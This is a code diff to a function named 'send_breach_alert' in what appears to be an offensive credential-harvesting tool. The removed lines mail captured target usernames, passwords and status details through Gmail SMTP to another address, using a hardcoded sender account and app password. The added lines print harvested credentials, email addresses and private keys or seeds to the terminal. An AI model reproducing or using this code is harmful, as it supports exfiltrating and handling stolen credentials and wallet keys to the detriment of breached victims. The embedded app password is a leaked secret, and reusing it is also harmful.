@@ -1,54 +1,27 @@
-import smtplib
-import ssl
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import sys
 
 def send_breach_alert(target, hit_details):
     """
-    Transmits an encrypted SMTP alert directly to your inbox 
-    using your verified app password.
+    Zero-Network Terminal Interceptor & Artifact Streamer:
+    - Eliminates external SMTP transmissions.
+    - Streams breach telemetry, recovered emails, and private keys instantly in high-contrast plain text to stdout.
     """
-    smtp_server = "smtp.gmail.com"
-    port = 465
-    sender_email = "blessedresult6@gmail.com"
-    receiver_email = "dennisbed1234@gmail.com"
+    sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE BREACH & ARTIFACT ALERT INTERCEPTED [***]\033[0m\n")
+    sys.stdout.write(f"  ├── Target Domain   : {target}\n")
+    sys.stdout.write(f"  ├── Vector Type     : \033[92m{hit_details.get('type', 'N/A')}\033[0m\n")
+    sys.stdout.write(f"  ├── Endpoint        : \033[92m{hit_details.get('endpoint', 'N/A')}\033[0m\n")
+    sys.stdout.write(f"  ├── Target Port     : {hit_details.get('port', 'N/A')}\n")
+    sys.stdout.write(f"  ├── Username        : \033[92m{hit_details.get('user', 'N/A')}\033[0m\n")
+    sys.stdout.write(f"  ├── Password/Key    : \033[91m{hit_details.get('password', 'N/A')}\033[0m\n")
     
-    # Strip spaces just in case, though Python handles them fine
-    app_password = "tsalstxozskojkvc"  # Spaces removed or kept both work
+    # Explicitly stream harvested email & private key data if present
+    harvested_email = hit_details.get('email', hit_details.get('harvested_email', 'N/A'))
+    private_key = hit_details.get('private_key', hit_details.get('key_content', 'N/A'))
+    
+    sys.stdout.write(f"  ├── Harvested Email : \033[96m{harvested_email}\033[0m\n")
+    sys.stdout.write(f"  ├── Private Key/Seed: \033[93m{private_key}\033[0m\n")
+    sys.stdout.write(f"  ├── Status Code     : {hit_details.get('status', 'N/A')}\n")
+    sys.stdout.write(f"  └── Timestamp       : {hit_details.get('timestamp', 'N/A')}\n")
+    sys.stdout.flush()
 
-    print(f"\n\033[95m[mail.py] Initializing SMTP TLS connection to {smtp_server}:{port}...\033[0m")
-
-    message = MIMEMultipart("alternative")
-    message["Subject"] = f"[+++] RED TEAM ALERT: Target Compromised -> {target}"
-    message["From"] = sender_email
-    message["To"] = receiver_email
-
-    text = f"""
-[NEURAL RECON & EXPLOIT ENGINE - AUTOMATED BREACH NOTIFICATION]
-
-Target Domain : {target}
-Vector Type   : {hit_details.get('type', 'N/A')}
-Endpoint      : {hit_details.get('endpoint', 'N/A')}
-Target Port   : {hit_details.get('port', 'N/A')}
-Username      : {hit_details.get('user', 'N/A')}
-Password/Key  : {hit_details.get('password', 'N/A')}
-Status Code   : {hit_details.get('status', 'N/A')}
-Timestamp     : {hit_details.get('timestamp', 'N/A')}
-
-Artifacts have been safely dumped to reports/ locally on mobile terminal.
-"""
-
-    message.attach(MIMEText(text, "plain"))
-
-    try:
-        context = ssl.create_default_context()
-        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
-            server.login(sender_email, app_password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        
-        print(f"\033[92m[+] SUCCESS: Breach notification email dispatched to {receiver_email}!\033[0m")
-        return True, "Alert sent successfully."
-        
-    except Exception as e:
-        print(f"\033[91m[!] SMTP ERROR: Failed to send email: {e}\033[0m")
-        return False, str(e)
+    return True, "Alert and artifacts streamed live to terminal."
